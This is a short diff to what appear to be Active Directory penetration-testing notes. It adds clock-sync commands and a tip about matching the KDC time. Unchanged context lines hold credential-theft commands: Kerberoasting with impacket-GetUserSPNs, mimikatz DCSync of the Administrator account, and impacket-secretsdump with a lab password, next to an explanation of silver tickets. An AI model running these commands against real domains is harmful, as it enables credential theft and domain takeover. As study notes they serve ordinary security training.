@@ -387,6 +387,8 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -ou
 sudo timedatectl set-ntp off
 sudo rdate -n 10.10.10.100
 Open a new terminal
+
+sudo ntpdate -s domain
 ```
 ###### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
 >Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.
@@ -495,4 +497,13 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 lsadump::dcsync /user:Administrator
 lsadump::dcsync /user:corp\Administrator
 kali: impacket-secretsdump -just-dc corp.com/controlledUser:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
+#### Tips
+>Always remeber to sync the kdc timestamp before conducting any AD actions such as reset password of another user
+```
+sudo timedatectl set-ntp off
+sudo rdate -n 10.10.10.100
+Open a new terminal
+
+sudo ntpdate -s doamin
 ```
